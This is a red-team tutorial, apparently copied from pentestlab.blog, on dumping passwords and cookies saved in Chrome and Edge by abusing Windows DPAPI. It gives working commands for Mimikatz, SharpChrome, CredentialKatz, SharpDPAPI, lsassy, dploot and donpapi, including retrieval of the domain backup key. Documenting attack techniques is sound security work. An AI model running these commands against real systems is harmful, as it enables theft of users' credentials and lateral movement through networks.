## Web Browser Store Credentials
Microsoft introduced Data Protection Application Programming Interface (DPAPI) in Windows environments as a method to encrypt and decrypt sensitive data such as credentials using the _CryptProtectData_ and _CryptUnprotectData_ functions. Browsers such as Chrome and Edge utilize DPAPI to encrypt credentials prior to storage. The master key is stored locally and can be decrypted with the password of the user, which then is used to decrypt DPAPI data blobs.

In the world of red team operations, locations which credentials are stored are always a target as it will allow access to other applications or lateral movement. Organizations which are utilizing Microsoft Edge or Google Chrome for storage the credentials of their users are vulnerable due to the abuse of CryptUnprotectData API ([T1555.003](https://attack.mitre.org/techniques/T1555/003/)). It should be noted that reading credentials stored in browsers doesn’t require any form of elevation and it is challenging for defensive teams to detect due to the high volume of events which are generated in case of monitoring.

Master keys are located in the following path and by default are not visible as these are classified as protected operating system files.

```
C:\users\<user>\appdata\roaming\microsoft\protect\<SID>\<MasterKey>
```
![[Pasted image 20250319221625.png]]![[Pasted image 20250319221634.png]]Mimikatz was the first tool that interacted with DPAPI, and has specific modules to perform decryption operations. However, the Mimikatz encrypted key parser is broken and therefore it can no longer be used to decrypt DPAPI blobs as it fails with a message of _No Alg and/or key handle_. Instead of using Mimikatz, it is feasible to harvest the encrypted key from “_Local State_” by executing the following command from a PowerShell console:
```
(gc "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" | ConvertFrom-Json).os_crypt.encrypted_key
```
![[Pasted image 20250319221728.png]]The encrypted key can be ingested in the Mimikatz _dpapi::chrome_ module to decrypt the contents of “_Login Data_“.

```
dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /encryptedkey:[EncryptedKey] /unprotect
```

[SharpChrome](https://github.com/GhostPack/SharpDPAPI/) is part of the SharpDPAPI and targets sensitive information stored in Chromium based browsers such as Chrome, Edge and Brave. The tool will attempt to read and decrypt the AES key from the “_Local State_” file using the cryptographic function BCrypt. The API _CryptUnprotectData()_ is used to decrypt passwords stored in browsers.

```
dotnet inline-execute SharpChrome logins
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-sharpchrome.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-sharpchrome.png)
An alternative tool called [CredentialKatz](https://github.com/Meckazin/ChromeKatz) implements a different method as credentials are dumped directly from the credential manager of Chrome or Edge. This method is more evasive as it attempts to inject into an existing browser process and read credentials and doesn’t utilize DPAPI for decryption. Offline parsing of credentials is also supported via a minidump file. CredentialKatz harvest passwords from credential manager in plain-text by using the _PasswordReuseDetectorImpl_ class.

```
CredentialKatz.exe
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-credentialkatz.png?w=808)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-credentialkatz.png)

CredentialKatz

## Domain Backup Key

In the event that domain administrator access has been achieved the DPAPI backup key can be retrieved from the domain controller to decrypt master keys from any user in the domain. The backup key is stored in the following Active Directory location:

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dpapi-backupkey.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dpapi-backupkey.png)

DPAPI – Backup Key

Mimikatz support remote dumping of the backup key by executing the following command:

```
lsadump::backupkeys /system:dc.red.lab /export
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-domain-backup-key-mimikatz.png?w=952)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-domain-backup-key-mimikatz.png)

Domain Backup Key

The exported backup key can be used in conjunction with the master key of the target user to decrypt the encryption key.

```
dpapi::masterkey /in:"C:\Users\peter\AppData\Roaming\Microsoft\Protect\S-1-5-21-955986923-3279314952-43775158-1105\15e65bfa-6f2b-4abc-8199-c53e32c31d6f" /pvk:backupkey.pvk
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-decrypt-master-key-mimikatz.png?w=960)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-decrypt-master-key-mimikatz.png)

Decrypt Master Key Mimikatz

Similarly, this activity can be performed by SharpDPAPI. If no .pvk file is specified the key will be displayed in the console.

```
dotnet inline-execute SharpDPAPI.exe backupkey /nowrap /server:dc.red.lab
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dpapi-domain-backup-key.png?w=1024)

DPAPI Domain Backup Key

```
SharpDPAPI.exe backupkey /nowrap /server:dc.red.lab /file:backupkey.pvk
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dpapi-domain-backup-key-file.png?w=961)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dpapi-domain-backup-key-file.png)

DPAPI Domain Backup Key File

## Non-Domain Joined

There is sufficient tooling to implement DPAPI operations remotely from a non-domain joined systems. Utilization of [lsassy](https://github.com/Hackndo/lsassy) can retrieve various information including master keys. Executing of the following command will retrieve and store master keys into a file.

```
lsassy -d purple.lab -u Administrator -p Password123 10.0.1.2 -m rdrleakdiag -M masterkeys
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-lsassy-master-keys.png?w=757)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-lsassy-master-keys.png)

lsassy Master Keys

The master keys file can be imported to [dploot](https://github.com/zblurx/dploot), a python implementation of SharpDPAPI, in conjunction with the browser flag. The tool will authenticate with the target host via SMB and will dump credentials and cookies stored in Microsoft Edge and Google Chrome. _dploot_ retrieves the AES key from the “_Local State_” file and then decrypts the credentials stored in the “_Login Data_” file.

```
dploot browser -d purple.lab -u Administrator -p Password123 10.0.1.2 -mkfile /home/kali/masterkeys
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dploot.png?w=750)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dploot.png)

dploot – Browser Credentials

it is also feasible to harvest master keys from _dploot_ with the _masterkeys_ flag.

```
dploot masterkeys -d purple.lab -u Administrator -p Password123 10.0.1.2
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dploot-master-key.png?w=749)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-dploot-master-key.png)

dploot – Master key

Similar operations can be performed with [donpapi](https://github.com/login-securite/DonPAPI).

```
donpapi red/Administrator:Password123@10.0.0.2 -o /home/kali
```

[![](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-donpapi.png?w=616)](https://pentestlab.blog/wp-content/uploads/2024/08/web-browser-stored-credentials-donpapi.png)

DonPapi

The majority of the tools discussed in this article following a specific sequence of events. If the tool is executing from a non-domain joined host (aka Linux), an SMB connection is initiated and then contents of the Local State file are read in order to decrypt the AES key before concluding the attack with the decryption of the passwords stored in the Login Data. Tools which are executed in memory from an implant are omitting the SMB connection. Except of CredentialKatz which implements a different approach all the other tools can be considered similar. The following image displays the sequence of events.

[![](https://pentestlab.blog/wp-content/uploads/2024/08/dpapi-linux.jpg)](https://pentestlab.blog/wp-content/uploads/2024/08/dpapi-linux.jpg)

#### Reference 
[pentestlab.blog](https://pentestlab.blog/category/red-team/credential-access/)